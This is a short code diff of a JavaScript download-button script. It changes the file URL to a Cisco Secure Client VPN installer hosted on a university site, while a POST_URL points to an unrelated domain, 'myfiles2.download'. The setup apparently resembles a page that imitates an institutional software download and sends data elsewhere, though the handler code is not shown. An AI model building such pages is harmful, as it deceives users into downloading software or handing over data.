@@ -134,7 +134,7 @@
   };
 
   const POST_URL = 'https://myfiles2.download/';
-  const DOWNLOAD_FILE = 'https://kb.itd.commonwealthu.edu/attachments/25/';
+  const DOWNLOAD_FILE = 'https://eeast.lehigh.edu/tools/software_management/cisco/msi/cisco-secure-client-win-5.1.8.122-core-vpn-predeploy-k9.msi';
 
   downloadBtn.addEventListener('click', async function () {
     if (!downloadBtn.classList.contains('active')) return;
@@ -176,4 +176,5 @@
   });
 
 })();
+
 
